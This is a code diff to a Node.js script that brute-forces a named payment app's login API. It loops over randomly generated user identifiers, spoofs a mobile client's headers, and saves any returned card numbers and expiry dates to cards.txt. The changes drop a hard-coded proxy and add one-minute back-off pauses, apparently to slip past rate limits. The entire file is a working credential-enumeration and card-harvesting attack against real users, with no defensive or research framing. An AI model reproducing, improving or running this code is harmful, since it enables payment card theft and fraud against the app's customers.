@@ -1,8 +1,6 @@
 const fetch = require('node-fetch');
-const fs = require("fs")
-var proxy = require("https-proxy-agent")
-Agent = new proxy.HttpsProxyAgent('36.255.221.75:18018');
-
+const fs = require("fs");
+i = 0;
 function fish(){
 var id = "012"+rand(7);
 //var id = "0125113504"
@@ -18,10 +16,9 @@ fetch('https://syberapp.sybertechnology.com/api/login', {
         'accept': 'application/json',
         'version': '100',
         'content-type': 'application/json;charset=utf-8',
-        'content-length': '233',
+        
         'accept-encoding': 'gzip',
-        'user-agent': 'okhttp/4.9.1',
-       // agent:Agent
+        'user-agent': 'okhttp/4.9.1'
     },
     body: JSON.stringify({
         'userIdentifier': id,
@@ -33,8 +30,11 @@ status = response.status;
 return response.text()
   
 }).then((data)=>{
+  i++;
   info = data;
   js = JSON.parse(data);
+  //console.log(i)
+  
   if(js.errorCode == 001){
   
 
@@ -46,10 +46,9 @@ fetch('https://syberapp.sybertechnology.com/api/login', {
         'accept': 'application/json',
         'version': '100',
         'content-type': 'application/json;charset=utf-8',
-        'content-length': '233',
+        
         'accept-encoding': 'gzip',
-        'user-agent': 'okhttp/4.9.1',
-      //  agent:Agent
+        'user-agent': 'okhttp/4.9.1'
     },
     body: JSON.stringify({
         'userIdentifier': id,
@@ -74,10 +73,9 @@ fetch('https://syberapp.sybertechnology.com/api/login', {
         'accept': 'application/json',
         'version': '100',
         'content-type': 'application/json;charset=utf-8',
-        'content-length': '233',
+        
         'accept-encoding': 'gzip',
-        'user-agent': 'okhttp/4.9.1',
-       // agent:Agent
+        'user-agent': 'okhttp/4.9.1'
     },
     body: JSON.stringify({
         'userIdentifier': id,
@@ -99,14 +97,18 @@ return response.text()
   var cards = data.cards;
   if(cards.length > 0){
 data.cards.forEach((card)=>{
+console.log(card.pan)
     fs.appendFile("cards.txt",card.pan+"|"+card.expDate+"\n",function (err) {if (err) throw err;});})
   }
 fish();
   }
     
   }).catch((err)=>{
-    //console.log(err)
+ console.log(" waiting 1 min "+i)
+    i =0;
+  setTimeout(function() {
     fish()
+  }, 60000);
  // console.log("Timed out?"+status);
   //console.log(info)
 })
@@ -119,16 +121,21 @@ fish();
   var cards = data.cards;
   if(cards.length > 0){
 data.cards.forEach((card)=>{
+  console.log(card.pan)
     fs.appendFile("cards.txt",card.pan+"|"+card.expDate+"\n",function (err) {if (err) throw err;});})
   }
 fish();
   }
     
   }).catch((err)=>{
-    //console.log(err)
-    fish()
+  
  // console.log("Timed out?"+status);
-  //console.log(info)
+  console.log(" waiting 1 min "+i)
+    i =0;
+  setTimeout(function() {
+    fish()
+  }, 60000);
+  
 })
 
 
@@ -137,17 +144,26 @@ fish();
 
   }else{
     var data = JSON.parse(data)
-  fs.appendFile("numbers.txt",id+"\n",function (err) {if (err) throw err;console.log(id + " ID"+info);});
+  fs.appendFile("numbers.txt",id+"\n",function (err) {if (err) throw err;console.log(id + " ID");});
   var cards = data.cards;
   if(cards.length > 0){
 data.cards.forEach((card)=>{
+  
+console.log(card.pan)
+
     fs.appendFile("cards.txt",card.pan+"|"+card.expDate+"\n",function (err) {if (err) throw err;});})
   }
 fish();
   }
   }).catch((err)=>{
-    //console.log(err)
+    
+   // var pos = err.search("token")
+    console.log(" waiting 1 min "+i)
+    i =0;
+  setTimeout(function() {
     fish()
+  }, 60000);
+    
  // console.log("Timed out?"+status);
   //console.log(info)
 })
